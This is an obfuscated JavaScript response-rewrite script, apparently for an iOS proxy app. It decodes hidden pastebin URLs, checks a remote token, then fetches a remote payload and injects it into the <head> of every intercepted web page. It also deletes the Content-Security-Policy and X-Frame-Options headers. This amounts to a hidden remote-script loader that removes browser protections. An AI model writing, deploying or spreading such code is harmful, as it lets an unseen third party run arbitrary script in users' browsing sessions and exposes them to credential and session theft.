const MY_TOKEN = "ojeng_gacor"; 

const _0xU1 = "aHR0cHM6"+"Ly9wYXN0ZWJpbi"+"5jb20vcmF3L0d"+"NMVIyZjh1";
const _0xU2 = "aHR0cHM6"+"Ly9wYXN0ZWJp"+"bi5jb20vcmF3L"+"2tSWFY3ZnNU";

const _0xF = ['includes', 'body', 'headers', 'replace', '<head>', 'Content-Security-Policy', 'X-Frame-Options', 'post'];
const _0xM = (n) => _0xF[n];

const _0xR1 = { url: atob(_0xU1) + "?t=" + Date.now() };
const _0xR2 = { url: atob(_0xU2) };

$task.fetch(_0xR1).then(response => {
    if (response.body && response.body[_0xM(0)](MY_TOKEN)) {
        $task.fetch(_0xR2).then(resp2 => {
            let b = $response[_0xM(1)];
            let h = $response[_0xM(2)];
            let p = resp2.body;

            if (h) {
                delete h[_0xM(5)];
                delete h[_0xM(6)];
            }

            if (b && p) {
                const tag = _0xM(4);
                b = b[_0xM(3)](tag, tag + p);
            }
            $done({ body: b, headers: h });
        }, () => $done({}));
    } else {
        if (response.body) {
            $notify("SYSTEM SECURITY", "ACCESS DENIED", "Token " + MY_TOKEN + " is not active.");
        }
        $done({});
    }
}, () => $done({}));
